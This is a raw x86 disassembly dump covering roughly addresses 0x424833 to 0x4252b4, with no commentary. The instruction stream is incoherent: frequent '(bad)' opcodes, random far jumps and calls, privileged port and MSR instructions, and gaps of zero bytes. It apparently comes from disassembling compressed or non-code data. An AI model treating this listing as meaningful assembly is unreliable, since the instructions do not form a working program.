  424833:	or     eax,0xc4b105d0
  424838:	adc    BYTE PTR [esi],ah
  42483a:	dec    esi
  42483b:	rol    BYTE PTR [edx+0x11],0x80
  42483f:	lods   al,BYTE PTR ds:[esi]
  424840:	leave  
  424841:	cmp    dl,dl
  424843:	daa    
  424844:	jo     0x424836
  424846:	(bad)  
  424847:	jle    0x424848
  424849:	dec    esi
  42484a:	pop    ecx
  42484b:	test   dl,0x39
  42484e:	fdivr  DWORD PTR [ebp+0x1e]
  424851:	(bad)  
  424852:	ffreep st(1)
  424854:	lods   eax,DWORD PTR ds:[esi]
  424855:	test   esp,ecx
  424857:	push   edx
  424858:	sub    esi,DWORD PTR [edx]
  42485a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42485b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42485c:	mov    esp,0x6fa4ef3a
  424861:	daa    
  424862:	adc    eax,0xd7caf944
  424867:	pusha  
  424868:	test   eax,0x6c74061e
  42486d:	adc    DWORD PTR [edx],esp
  42486f:	cmp    DWORD PTR [ecx+0x66],ebp
  424872:	dec    esp
  424873:	mov    ds:0x9d323d79,al
  424878:	xchg   ecx,eax
  424879:	push   esi
  42487a:	jl     0x424843
  42487c:	push   ecx
  42487d:	shl    BYTE PTR [esi-0x43],1
  424880:	ja     0x424875
  424882:	(bad)  
  424883:	(bad)  
  424884:	popa   
  424885:	not    DWORD PTR [edi+0x27321f1f]
  42488b:	mov    esi,0xa6a5024b
  424890:	adc    ebp,DWORD PTR [esi]
  424892:	stos   DWORD PTR es:[edi],eax
  424893:	push   ebx
  424894:	inc    ebp
  424895:	aam    0x50
  424897:	jl     0x4248d6
  424899:	or     DWORD PTR [edx+0x58],ebp
  42489c:	or     ebp,ebp
  42489e:	mov    edx,0x3ccb08d
  4248a3:	das    
  4248a4:	fist   WORD PTR [esi+0x40]
  4248a7:	mov    esi,0xca854bdb
  4248ac:	popa   
  4248ad:	xor    BYTE PTR [ebp-0x7b7c1d0],dh
  4248b3:	lahf   
  4248b4:	dec    ecx
  4248b5:	in     eax,0xef
  4248b7:	data16 jecxz 0x424856
  4248ba:	jb     0x424893
  4248bc:	pop    edx
  4248bd:	sbb    DWORD PTR [ecx],esp
  4248bf:	(bad)  
  4248c1:	mov    bh,0xfd
  4248c3:	or     BYTE PTR [ecx+ebp*8-0x2e],dh
  4248c7:	mov    ds:0xa3866ec3,eax
  4248cc:	mov    ch,0xf1
  4248ce:	xchg   ebp,eax
  4248cf:	ret    
  4248d0:	push   ebx
  4248d1:	push   ss
  4248d2:	out    dx,eax
  4248d3:	mov    ebx,0x7ce95018
  4248d8:	popf   
  4248d9:	out    dx,al
  4248da:	js     0x424903
  4248dc:	dec    edi
  4248dd:	mov    ebx,0x3bc3dd5f
  4248e2:	push   0xa9d162bc
  4248e7:	xchg   ebp,eax
  4248e8:	cmp    ebp,DWORD PTR [edi]
  4248ea:	adc    ch,BYTE PTR [ebx-0x64]
  4248ed:	lahf   
  4248ee:	or     bh,BYTE PTR es:[edx+0x26]
  4248f2:	add    al,0x70
  4248f4:	mov    esi,0xfa9dce7c
  4248f9:	jmp    0x7e19:0xcb62174b
  424900:	aas    
  424901:	or     BYTE PTR [edi-0x7ccd0fe],bl
  424907:	aad    0x4d
  424909:	(bad)  
  42490a:	stc    
  42490b:	stos   BYTE PTR es:[edi],al
  42490c:	cmp    ch,BYTE PTR [edx+0x25]
  42490f:	push   esp
  424910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424911:	xor    BYTE PTR [ecx+edx*8],dl
  424914:	mov    edx,0x79395c3c
  42491a:	adc    al,0x86
  42491c:	cs inc edi
  42491e:	or     DWORD PTR [eax],esp
  424920:	add    BYTE PTR [edi-0x2a],0x8b
  424924:	out    0x6b,eax
  424926:	xchg   ebp,eax
  424927:	fdivr  st(2),st
  424929:	mov    esp,0xfd6ee9ae
  42492e:	cmp    ecx,esp
  424930:	cwde   
  424931:	and    DWORD PTR [esp+ebx*4],esi
  424934:	add    BYTE PTR ds:[eax],al
	...
  424993:	add    BYTE PTR [eax],al
  424995:	add    BYTE PTR [ebx+0x18],ch
  424998:	arpl   WORD PTR [edx+0x73],bp
  42499b:	jnp    0x424a08
  42499d:	sbb    ebp,eax
  42499f:	adc    eax,0xcf61bac2
  4249a4:	(bad)  
  4249a5:	jae    0x424972
  4249a7:	test   DWORD PTR [ecx],eax
  4249a9:	add    BYTE PTR [edi],al
  4249ab:	add    DWORD PTR [eax],eax
  4249ad:	add    BYTE PTR [esp+ebp*8-0x34],ah
  4249b1:	push   0x1e
  4249b3:	fwait
  4249b4:	dec    ebp
  4249b5:	std    
  4249b6:	push   0xffffffa8
  4249b8:	dec    esi
  4249b9:	not    DWORD PTR [bx+si+0x7158]
  4249be:	or     BYTE PTR [edi-0x76f21c4e],al
  4249c4:	ins    DWORD PTR es:[edi],dx
  4249c5:	mov    dl,0x3c
  4249c7:	xchg   edi,eax
  4249c8:	sbb    ebp,esp
  4249ca:	aas    
  4249cb:	dec    ebp
  4249cc:	jle    0x424952
  4249ce:	ficomp DWORD PTR [esi-0x46de73fb]
  4249d5:	mov    eax,0xc50ea931
  4249da:	fst    QWORD PTR [edx-0x4b58a758]
  4249e0:	fst    DWORD PTR [ecx]
  4249e2:	push   cs
  4249e3:	cmp    cl,al
  4249e5:	loop   0x4249df
  4249e7:	jle    0x4249c1
  4249e9:	repnz nop
  4249eb:	xor    BYTE PTR [ecx-0x61e27f71],al
  4249f1:	mov    cl,BYTE PTR [edx]
  4249f3:	dec    eax
  4249f4:	mov    edi,0xf4cfe6a2
  4249f9:	mov    cl,0x49
  4249fb:	loop   0x4249d1
  4249fd:	enter  0xdcbe,0x40
  424a01:	sbb    ah,BYTE PTR [edx]
  424a03:	aad    0x8a
  424a05:	outs   dx,DWORD PTR ds:[esi]
  424a06:	sar    BYTE PTR [ebp+0x1c],1
  424a09:	in     eax,0xfd
  424a0b:	jne    0x424a53
  424a0d:	out    dx,eax
  424a0e:	fisubr WORD PTR [ebx+0x55675080]
  424a14:	dec    esi
  424a15:	and    bh,dl
  424a17:	dec    ebx
  424a18:	push   es
  424a19:	wrmsr  
  424a1b:	mov    cl,0x7
  424a1d:	adc    esi,ebx
  424a1f:	ja     0x424a8f
  424a21:	scas   al,BYTE PTR es:[edi]
  424a22:	(bad)  
  424a23:	mov    esp,0x59e7a322
  424a28:	pusha  
  424a29:	mov    cl,0x6f
  424a2b:	add    dh,BYTE PTR [ecx]
  424a2d:	(bad)  
  424a2e:	lahf   
  424a2f:	cmp    eax,0xd3041679
  424a34:	test   al,0x37
  424a36:	and    DWORD PTR [eax+0x77cd94e7],esp
  424a3c:	sub    BYTE PTR [esi+0x61],al
  424a3f:	nop
  424a40:	push   edi
  424a41:	cli    
  424a42:	xchg   edi,eax
  424a43:	popf   
  424a44:	leave  
  424a45:	sub    eax,0xcaec2cf2
  424a4a:	push   es
  424a4b:	push   ebp
  424a4c:	sti    
  424a4d:	test   ah,dh
  424a4f:	out    0xaa,al
  424a51:	leave  
  424a52:	cmc    
  424a53:	ins    BYTE PTR es:[edi],dx
  424a54:	cmp    BYTE PTR [esi+0xfe8492],ah
  424a5a:	cmp    BYTE PTR [eax],dh
  424a5c:	xchg   esp,eax
  424a5d:	jecxz  0x424ad3
  424a5f:	or     al,BYTE PTR [ebp+0x37]
  424a62:	mov    ds:0x6e7e3231,al
  424a67:	mov    ecx,0xc1e86a4
  424a6c:	adc    BYTE PTR [esi+0x7eb7fd17],dh
  424a72:	jmp    0x4249f9
  424a74:	mov    edi,0x83c3a6cf
  424a79:	out    dx,eax
  424a7a:	or     ah,bh
  424a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a7d:	jne    0x424a69
  424a7f:	jno    0x424a63
  424a81:	clc    
  424a82:	mov    bh,0x97
  424a84:	sub    al,0xaa
  424a86:	jecxz  0x424ad0
  424a88:	add    DWORD PTR [edx-0x66dd0519],0x23fa8728
  424a92:	mov    edx,0xba0e58a9
  424a97:	mov    ds:0x5915dd72,al
  424a9c:	mov    esi,0x3db3b6a1
  424aa1:	xchg   ebp,eax
  424aa2:	pop    ss
  424aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424aa4:	test   dh,al
  424aa6:	dec    esi
  424aa7:	pop    edx
  424aa8:	(bad)  
  424aa9:	push   ebp
  424aaa:	push   edi
  424aab:	in     al,0xbe
  424aad:	rol    DWORD PTR [edx+0x4f],1
  424ab0:	ss ret 
  424ab2:	dec    BYTE PTR [esi-0x50]
	...
  424b15:	add    BYTE PTR [esi],al
  424b17:	aas    
  424b18:	or     eax,0xb6bb3db9
  424b1d:	mov    edi,0x1cbed53b
  424b22:	sub    eax,ebx
  424b24:	nop
  424b25:	pusha  
  424b26:	rol    BYTE PTR [esi+0x1070001],cl
  424b2c:	add    BYTE PTR [eax],al
  424b2e:	sti    
  424b2f:	xchg   dl,cl
  424b31:	jge    0x424b59
  424b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b34:	iret   
  424b35:	dec    ebx
  424b36:	mov    BYTE PTR [eax],ch
  424b38:	mov    bh,0x30
  424b3a:	inc    ebx
  424b3b:	imul   eax,esi,0x39013307
  424b41:	mov    cl,0x79
  424b43:	(bad)  
  424b45:	cmc    
  424b46:	xchg   ebp,eax
  424b47:	dec    esi
  424b48:	xchg   esi,eax
  424b49:	mov    WORD PTR [ecx-0x3b],cs
  424b4c:	or     ch,BYTE PTR [ecx-0x49]
  424b4f:	push   DWORD PTR [edi+0x6a9df56d]
  424b55:	aad    0x86
  424b57:	sbb    DWORD PTR [ecx+0x54d4dbcc],esi
  424b5d:	ror    dl,0x72
  424b60:	jae    0x424b95
  424b62:	adc    eax,0x6fd9b0bb
  424b67:	pop    edi
  424b68:	mov    ds:0x87d8fd98,eax
  424b6d:	or     eax,0x758f724
  424b72:	scas   al,BYTE PTR es:[edi]
  424b73:	aam    0x2f
  424b75:	add    eax,0x86ded21f
  424b7a:	or     al,0x35
  424b7c:	fstp   DWORD PTR [ebx]
  424b7e:	hlt    
  424b7f:	popf   
  424b80:	std    
  424b81:	inc    ebx
  424b82:	pop    eax
  424b83:	das    
  424b84:	stos   BYTE PTR es:[edi],al
  424b85:	rcr    BYTE PTR [edi+ecx*8],1
  424b88:	jle    0x424bd8
  424b8a:	inc    esi
  424b8b:	mov    cl,0x1b
  424b8d:	mov    WORD PTR [ecx+0x4012addf],ss
  424b93:	cmp    dh,ch
  424b95:	sub    eax,ebp
  424b97:	sti    
  424b98:	mov    ah,0xa3
  424b9a:	push   ebx
  424b9b:	xchg   ebp,eax
  424b9c:	mov    al,0x30
  424b9e:	dec    esi
  424b9f:	jp     0x8ba22a51
  424ba5:	xor    eax,0x3a9b329b
  424baa:	and    al,0xd6
  424bac:	(bad)  
  424bad:	repnz dec ecx
  424baf:	imul   ebp,DWORD PTR [ebx-0x3],0xffffffea
  424bb3:	lods   al,BYTE PTR ds:[esi]
  424bb4:	or     ch,BYTE PTR [ecx]
  424bb6:	pop    ss
  424bb7:	jmp    0x7745:0xfbc78004
  424bbe:	xchg   ecx,eax
  424bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424bc0:	arpl   WORD PTR [ebx-0x607aa11d],sp
  424bc6:	(bad)  
  424bc7:	int3   
  424bc8:	add    DWORD PTR [edi-0x49e8a488],eax
  424bce:	inc    ebx
  424bcf:	and    ch,BYTE PTR [esi+0x272bf301]
  424bd5:	repz jp 0x424c08
  424bd8:	js     0x424bf2
  424bda:	inc    eax
  424bdb:	out    0x61,al
  424bdd:	inc    esi
  424bde:	je     0x424ba2
  424be0:	out    dx,al
  424be1:	xchg   BYTE PTR [ecx-0x46a77fcc],ch
  424be7:	dec    ecx
  424be8:	and    DWORD PTR [ebp+0x33f036ac],esp
  424bee:	sbb    BYTE PTR [esi+edi*1],bh
  424bf1:	xor    eax,0xdbc5c8f
  424bf6:	pop    ebp
  424bf7:	push   ebx
  424bf8:	or     ah,BYTE PTR [ebp+0x5b07a4d4]
  424bfe:	jne    0x424c76
  424c00:	shl    DWORD PTR [edx],cl
  424c02:	adc    edx,ebp
  424c04:	in     al,dx
  424c05:	call   0xab84f4c6
  424c0a:	pushf  
  424c0b:	sub    DWORD PTR [edi-0x58439b94],eax
  424c11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c12:	jns    0x424c0f
  424c14:	rol    BYTE PTR [edx],0x18
  424c17:	(bad)  
  424c18:	loop   0x424c7a
  424c1a:	sub    DWORD PTR [ebx+0x27],esp
  424c1d:	adc    eax,0x19
  424c20:	ret    
  424c21:	ds jnp 0x424c0a
  424c24:	cmc    
  424c25:	(bad)  
  424c26:	and    DWORD PTR [edx+0x12983349],0x8afa4855
  424c30:	and    DWORD PTR [eax],edx
  424c32:	mov    esp,0x6c4
	...
  424c93:	add    BYTE PTR [eax],al
  424c95:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424c99:	push   0xffffffb6
  424c9b:	outs   dx,BYTE PTR ds:[esi]
  424c9c:	(bad)  
  424c9d:	fisubr WORD PTR ds:0xaf588c09
  424ca3:	fmul   DWORD PTR [ecx+ebp*4+0x187d9]
  424caa:	pop    es
  424cab:	add    DWORD PTR [eax],eax
  424cad:	add    BYTE PTR [eax+0x5a],ch
  424cb0:	pop    edx
  424cb1:	or     dh,bh
  424cb3:	(bad)  [edi-0x4f6baae8]
  424cb9:	or     DWORD PTR [edi],esi
  424cbb:	or     DWORD PTR fs:[edx+0x3],esi
  424cbf:	hlt    
  424cc0:	adc    BYTE PTR [edx-0x7c423c74],0x25
  424cc7:	loop   0x424cc9
  424cc9:	ds popf 
  424ccb:	ret    0x3f92
  424cce:	lahf   
  424ccf:	push   esi
  424cd0:	fyl2xp1 
  424cd2:	dec    edi
  424cd3:	and    ebx,DWORD PTR [esi+0x70]
  424cd6:	ror    BYTE PTR [edi],1
  424cd8:	inc    edi
  424cd9:	jno    0x424d09
  424cdb:	jae    0x424d1a
  424cdd:	gs ds ja 0x424d0a
  424ce1:	lock push es
  424ce3:	mov    ebp,esi
  424ce5:	(bad)  
  424ce6:	xchg   edx,eax
  424ce7:	jae    0x424d68
  424ce9:	xchg   ecx,eax
  424cea:	adc    ch,BYTE PTR [edi-0x3569ead6]
  424cf0:	or     DWORD PTR [edx-0x71170504],ebx
  424cf6:	fadd   DWORD PTR [edx-0x7a061adc]
  424cfc:	leave  
  424cfd:	out    0x3,al
  424cff:	gs (bad) 
  424d01:	fbstp  TBYTE PTR [esp+eiz*4-0x2f0244d]
  424d08:	lea    ecx,[edx-0x6e6877fe]
  424d0e:	int    0x86
  424d10:	ror    BYTE PTR [esp+edi*1+0x5ea78ac2],cl
  424d17:	cwde   
  424d18:	hlt    
  424d19:	mov    ebx,DWORD PTR [esi]
  424d1b:	out    dx,eax
  424d1c:	icebp  
  424d1d:	jl     0x424d9e
  424d1f:	outs   dx,DWORD PTR ds:[esi]
  424d20:	push   es
  424d21:	ret    0x5245
  424d24:	xor    al,0x14
  424d26:	xchg   ebx,eax
  424d27:	xchg   BYTE PTR [esi+0x5f8a51e0],cl
  424d2d:	call   0x2c4:0x1adf658d
  424d34:	sub    al,0xf4
  424d36:	mov    edi,0x2c0ac3a0
  424d3b:	push   0xed9cc506
  424d40:	sbb    DWORD PTR [edx-0x49980587],0x94bd3e62
  424d4a:	and    al,0x74
  424d4c:	sub    BYTE PTR [esi+0x1d3df2e7],ah
  424d52:	mov    dh,0x87
  424d54:	jp     0x424d75
  424d56:	mov    al,ds:0x72fd778c
  424d5b:	retf   0x632a
  424d5e:	clc    
  424d5f:	loopne 0x424dbe
  424d61:	mov    al,0xed
  424d63:	mov    eax,0x71cf8c6e
  424d68:	mov    ebp,0x5d1455c0
  424d6d:	adc    eax,0x1d9aad4
  424d72:	and    eax,0xcac95fb4
  424d77:	mov    ecx,0xf7377c07
  424d7c:	shl    DWORD PTR [ebx+0x376df87b],0x77
  424d83:	and    esp,DWORD PTR [ebx-0x7bb64e36]
  424d89:	xor    cl,BYTE PTR [ecx+ebp*8-0x3c1954d6]
  424d90:	push   esp
  424d91:	nop
  424d92:	aas    
  424d93:	xchg   ebp,eax
  424d94:	xchg   esi,eax
  424d95:	jbe    0x424dda
  424d97:	out    dx,eax
  424d98:	push   cs
  424d99:	stos   DWORD PTR es:[edi],eax
  424d9a:	lds    edi,FWORD PTR [edx-0x346cd0ac]
  424da0:	push   edx
  424da1:	mov    ds:0xb0b4a7ee,al
  424da6:	shl    BYTE PTR [ebx+0x48],0x31
  424daa:	clc    
  424dab:	dec    esi
  424dac:	mov    eax,0x2bfd78d7
  424db1:	data16 fst DWORD PTR [edx+0x2f]
	...
  424e15:	add    BYTE PTR ds:0xf361d20c,bh
  424e1b:	(bad)  
  424e1c:	mov    edi,0xb8b3635c
  424e21:	xchg   DWORD PTR [ebx-0x79],edx
  424e24:	sub    bl,BYTE PTR [ecx]
  424e26:	loopne 0x424db0
  424e28:	add    DWORD PTR [eax],eax
  424e2a:	pop    es
  424e2b:	add    DWORD PTR [eax],eax
  424e2d:	add    BYTE PTR [eax],ch
  424e2f:	push   esi
  424e30:	adc    DWORD PTR [esi-0xf],esp
  424e33:	mov    ebx,0x885e3565
  424e38:	push   esp
  424e39:	xlat   BYTE PTR ds:[ebx]
  424e3a:	shr    BYTE PTR [edi-0x4827cc82],0x4
  424e41:	jmp    0x424dd1
  424e43:	lods   eax,DWORD PTR ds:[esi]
  424e44:	xchg   ebp,eax
  424e45:	retf   
  424e46:	mov    dl,BYTE PTR [edx+0x30]
  424e49:	ss xchg ebx,eax
  424e4b:	mov    eax,0xbc06783
  424e50:	popf   
  424e51:	retf   0xad70
  424e54:	rcr    BYTE PTR [edx],1
  424e56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e57:	enter  0xd1f9,0x23
  424e5b:	xor    eax,0x84aff771
  424e60:	inc    esp
  424e61:	aas    
  424e62:	mov    ds:0x18266139,eax
  424e67:	push   ds
  424e68:	inc    ebp
  424e69:	and    ebp,DWORD PTR [edx+eax*2-0x995c1c1]
  424e70:	push   0x158859d4
  424e75:	cmp    DWORD PTR [esi-0x1676d9f4],edi
  424e7b:	fstp   QWORD PTR ds:0x8eaa7d2a
  424e81:	data16 xchg BYTE PTR [ebp-0x61],bl
  424e85:	int3   
  424e86:	das    
  424e87:	pop    ebx
  424e88:	cld    
  424e89:	xchg   edx,eax
  424e8a:	sub    al,BYTE PTR [esi+0xa]
  424e8d:	push   ss
  424e8e:	aam    0x2e
  424e90:	xchg   esi,eax
  424e91:	lock xor BYTE PTR es:[edx],0x45
  424e96:	dec    esp
  424e97:	and    BYTE PTR es:[ebx],dh
  424e9a:	out    dx,al
  424e9b:	cmp    eax,0x50be692a
  424ea0:	ins    DWORD PTR es:[edi],dx
  424ea1:	or     eax,eax
  424ea3:	jl     0x424e51
  424ea5:	arpl   WORD PTR [edx-0x3],bx
  424ea8:	pop    esi
  424ea9:	ins    BYTE PTR es:[edi],dx
  424eaa:	inc    esi
  424eab:	icebp  
  424eac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ead:	lahf   
  424eae:	ss inc edi
  424eb0:	push   ebp
  424eb1:	cmp    dl,al
  424eb3:	in     eax,0xa
  424eb5:	out    0x2e,al
  424eb7:	mov    dl,0x2e
  424eb9:	dec    ebx
  424eba:	mov    bl,0xbc
  424ebc:	jo     0x424f22
  424ebe:	inc    esi
  424ebf:	xchg   DWORD PTR [ebx],ecx
  424ec1:	stc    
  424ec2:	gs nop
  424ec4:	adc    eax,0x668ab37c
  424ec9:	in     eax,dx
  424eca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ecb:	ret    0xa591
  424ece:	pop    ss
  424ecf:	aad    0x94
  424ed1:	ret    0xf4f4
  424ed4:	sub    DWORD PTR [ebx],ebp
  424ed6:	mov    ah,0x28
  424ed8:	jl     0x424e6e
  424eda:	cmp    edx,DWORD PTR [esi+0x49798f37]
  424ee0:	dec    eax
  424ee1:	xchg   esp,eax
  424ee2:	pop    edx
  424ee3:	scas   eax,DWORD PTR es:[edi]
  424ee4:	test   eax,0xd0e7657c
  424ee9:	push   0xa93bc59a
  424eee:	les    edi,FWORD PTR [edi]
  424ef0:	pop    es
  424ef1:	in     al,dx
  424ef2:	out    0x71,al
  424ef4:	shl    DWORD PTR [edi-0x13],cl
  424ef7:	loopne 0x424f29
  424ef9:	call   0x83fe:0xb6c907cc
  424f00:	xchg   edx,eax
  424f01:	aam    0x34
  424f03:	or     BYTE PTR [ebx+eiz*8+0x6d],0x83
  424f08:	pushf  
  424f09:	fmul   st(2),st
  424f0b:	bound  ebp,QWORD PTR [edx+eax*1-0x3890fdb9]
  424f12:	es push esp
  424f14:	(bad)  
  424f15:	stos   BYTE PTR es:[edi],al
  424f16:	inc    eax
  424f17:	jno    0x424f69
  424f19:	xor    ebp,DWORD PTR [ebp+0x5df1304b]
  424f1f:	push   edx
  424f20:	lds    esi,FWORD PTR [eax-0x73]
  424f23:	call   DWORD PTR [edi]
  424f25:	mov    esp,0x10ec96c9
  424f2a:	call   0xcf4d283f
  424f2f:	daa    
  424f30:	pop    es
  424f31:	add    DWORD PTR ds:0x133c,edx
	...
  424f93:	add    BYTE PTR [eax],al
  424f95:	add    BYTE PTR [ebx+0x16],cl
  424f98:	int    0x41
  424f9a:	fstp   st(3)
  424f9c:	iret   
  424f9d:	push   ds
  424f9e:	xor    al,0x88
  424fa0:	ror    BYTE PTR [eax+0x13a9077],1
  424fa6:	out    0x89,eax
  424fa8:	add    DWORD PTR [eax],eax
  424faa:	pop    es
  424fab:	add    DWORD PTR [eax],eax
  424fad:	add    BYTE PTR [eax-0x6a],bh
  424fb0:	in     eax,0x4a
  424fb2:	out    dx,eax
  424fb3:	in     al,0xf8
  424fb5:	cmp    DWORD PTR [ecx+0x56],0xea906804
  424fbc:	gs add eax,0x4d5a9f37
  424fc2:	sub    ch,ch
  424fc4:	adc    eax,0xdf5870fe
  424fc9:	call   0x171a:0x7215bb4c
  424fd0:	mov    dl,BYTE PTR [edi]
  424fd2:	retf   
  424fd3:	cmp    BYTE PTR [ebx],0x63
  424fd6:	add    eax,0x58
  424fd9:	or     cl,BYTE PTR [edi-0x4e]
  424fdc:	retf   
  424fdd:	inc    eax
  424fde:	jb     0x425022
  424fe0:	push   edi
  424fe1:	push   0xffffffe6
  424fe3:	jmp    0x507e:0xdccc93e8
  424fea:	and    ch,BYTE PTR [eax]
  424fec:	gs xor eax,0x6a0a0d25
  424ff2:	push   cs
  424ff3:	stc    
  424ff4:	lods   eax,DWORD PTR ds:[esi]
  424ff5:	(bad)  
  424ff6:	pop    esi
  424ff7:	and    ebp,ecx
  424ff9:	sub    al,0x9a
  424ffb:	add    eax,0xa7119785
  425000:	pop    ecx
  425001:	dec    edx
  425002:	xchg   ecx,eax
  425003:	xchg   edx,eax
  425004:	mov    edx,0xaed4f867
  425009:	or     eax,0x225c8cf2
  42500e:	or     al,BYTE PTR [eax+eax*4]
  425011:	xor    bl,BYTE PTR [eax+0x30e8cfed]
  425017:	(bad)  
  425018:	(bad)  
  42501a:	xchg   DWORD PTR [ecx-0x2c],ebx
  42501d:	or     eax,0xe1de9e97
  425022:	xor    BYTE PTR [ebx],0x11
  425025:	hlt    
  425026:	pusha  
  425027:	jecxz  0x425008
  425029:	mov    ah,dl
  42502b:	xor    al,0xa0
  42502d:	push   0x46
  42502f:	and    BYTE PTR ds:0xfcee76c2,dh
  425035:	mov    dl,0x85
  425037:	retf   0xebb
  42503a:	into   
  42503b:	add    DWORD PTR [ecx],0xbe89055e
  425041:	or     BYTE PTR [ebx],ch
  425043:	dec    edx
  425044:	(bad)  
  425045:	or     eax,0x6f7656cb
  42504a:	aad    0xf8
  42504c:	jne    0x425081
  42504e:	ds push ecx
  425050:	push   esp
  425051:	jle    0x4250b6
  425053:	xchg   esi,eax
  425054:	inc    esp
  425055:	repnz ins DWORD PTR es:[edi],dx
  425057:	js     0x4250cc
  425059:	mov    ebp,0x1c118223
  42505e:	(bad)  
  42505f:	mov    edi,0x220b71b2
  425064:	loope  0x425074
  425066:	mov    ss,ecx
  425068:	push   cs
  425069:	aad    0x62
  42506b:	pop    esp
  42506c:	inc    esi
  42506d:	(bad)  
  42506e:	adc    bh,BYTE PTR [ecx]
  425070:	dec    edx
  425071:	sbb    al,bh
  425073:	jg     0x425095
  425075:	inc    esp
  425076:	pop    es
  425077:	inc    eax
  425078:	adc    eax,0x19cd9cb7
  42507d:	inc    ebx
  42507e:	in     al,dx
  42507f:	pop    ss
  425080:	(bad)  
  425081:	out    dx,al
  425082:	mov    dl,dl
  425084:	xchg   BYTE PTR [esi-0x77bd9add],ah
  42508a:	loop   0x42508a
  42508c:	jae    0x425104
  42508e:	xor    al,0x4f
  425090:	sbb    eax,0xf9f3942f
  425095:	dec    esi
  425096:	dec    edx
  425097:	jle    0x425056
  425099:	cmp    DWORD PTR [ebx+0x45bc3196],edi
  42509f:	retf   0x22ba
  4250a2:	pop    edi
  4250a3:	(bad)
  4250a6:	jmp    0x425055
  4250a8:	adc    eax,0x92a3706
  4250ad:	jnp    0x42503f
  4250af:	lds    edi,FWORD PTR [eax+0x6fe54ed7]
	...
  425115:	add    dh,bl
  425117:	adc    DWORD PTR [edi-0x15020dd],ebx
  42511d:	std    
  42511e:	and    al,0x47
  425120:	xchg   edi,eax
  425121:	rol    ah,cl
  425123:	mov    ah,0xb2
  425125:	(bad)  
  425126:	out    dx,al
  425127:	mov    al,BYTE PTR [ecx]
  425129:	add    BYTE PTR [edi],al
  42512b:	add    DWORD PTR [eax],eax
  42512d:	add    BYTE PTR [edx+0x246020c8],al
  425133:	lock pop edi
  425135:	out    dx,eax
  425136:	lahf   
  425137:	adc    al,0x9a
  425139:	addr16 pop ebx
  42513b:	and    DWORD PTR [eax],esi
  42513d:	jne    0x425118
  42513f:	enter  0x9b29,0x9d
  425143:	mov    edi,0x6434cddf
  425148:	cmp    ecx,ebp
  42514a:	in     al,dx
  42514b:	push   0x89f2cdc5
  425150:	icebp  
  425151:	fcomp  st(7)
  425153:	(bad)  
  425154:	sub    dl,BYTE PTR [ebp+0x4ec904b7]
  42515a:	imul   edi,edi,0xb56a069
  425160:	arpl   WORD PTR [ebp-0x836d75e],bp
  425166:	lea    ebx,[esp+esi*1-0x6c2be6d0]
  42516d:	aam    0x1b
  42516f:	dec    edi
  425170:	retf   
  425171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425172:	popf   
  425173:	call   0x2f5d:0x3e2a56af
  42517a:	sbb    bh,dh
  42517c:	pop    ebx
  42517d:	or     BYTE PTR [ebx-0x3617f45d],bl
  425183:	leave  
  425184:	adc    BYTE PTR [ebp-0x2edae1be],dl
  42518a:	js     0x425200
  42518c:	test   eax,0x21bd6d3c
  425191:	int    0x1c
  425193:	ret    
  425194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425195:	sbb    dl,BYTE PTR [edx+ecx*4+0x719afa11]
  42519c:	aad    0x53
  42519e:	jge    0x4251b5
  4251a0:	xor    BYTE PTR [eax-0x361e936],dh
  4251a6:	das    
  4251a7:	mov    edi,DWORD PTR [edx-0x60197313]
  4251ad:	adc    cl,BYTE PTR [ecx+ecx*4-0x46bfb5c7]
  4251b4:	add    bl,BYTE PTR [eax]
  4251b6:	jb     0x4251a7
  4251b8:	into   
  4251b9:	call   0x58d99c62
  4251be:	(bad)  
  4251bf:	mov    cs,WORD PTR [ebx-0x36fac737]
  4251c5:	adc    eax,0x9bb203f7
  4251ca:	push   edx
  4251cb:	mov    esi,0x51e05681
  4251d0:	icebp  
  4251d1:	inc    esi
  4251d2:	jne    0x4251c5
  4251d4:	mov    esp,0xa804b0ee
  4251d9:	dec    esi
  4251da:	pop    edi
  4251db:	mov    BYTE PTR [esp+ebp*8-0x9],dl
  4251df:	mov    dl,0x8a
  4251e1:	into   
  4251e2:	repnz outs dx,DWORD PTR ds:[esi]
  4251e4:	pop    ebx
  4251e5:	mov    esi,0x99ebb220
  4251ea:	and    edx,esi
  4251ec:	mov    al,0xd4
  4251ee:	mov    ds:0x5788d45f,al
  4251f3:	fnsave [ecx-0x2e]
  4251f6:	ds (bad) 
  4251f8:	sub    eax,0x291bc51
  4251fd:	(bad)
  425200:	test   ebx,ecx
  425202:	fisttp QWORD PTR [eax]
  425204:	xchg   DWORD PTR [ecx],esi
  425206:	push   eax
  425207:	and    bh,ah
  425209:	push   ss
  42520a:	mov    ebx,0xda475711
  42520f:	dec    ebp
  425210:	xchg   BYTE PTR [ebx-0x66],dh
  425213:	mov    bh,0x82
  425215:	xchg   edx,eax
  425216:	xor    eax,0x62a514e
  42521b:	adc    ebx,eax
  42521d:	retf   0x6736
  425220:	sti    
  425221:	sbb    ecx,edi
  425223:	mov    dl,al
  425225:	sub    eax,0x37085c1a
  42522a:	les    ebx,FWORD PTR [edx-0x64623b53]
  425230:	mov    bh,0xcc
  425232:	cs cmp eax,0xd
	...
  425294:	add    BYTE PTR [eax],al
  425296:	lods   al,BYTE PTR ds:[esi]
  425297:	les    esi,FWORD PTR [ebx-0x32]
  42529a:	jnp    0x42529b
  42529c:	mov    ebp,0x2e2083e6
  4252a1:	add    eax,0x3dcf16ec
  4252a6:	cmc    
  4252a7:	mov    eax,DWORD PTR [ecx]
  4252a9:	add    BYTE PTR [edi],al
  4252ab:	add    DWORD PTR [eax],eax
  4252ad:	add    BYTE PTR [ecx+0x656fac3b],dh
  4252b3:	dec    edx
  4252b4:	test   BYTE PTR [eax-0x1a],cl
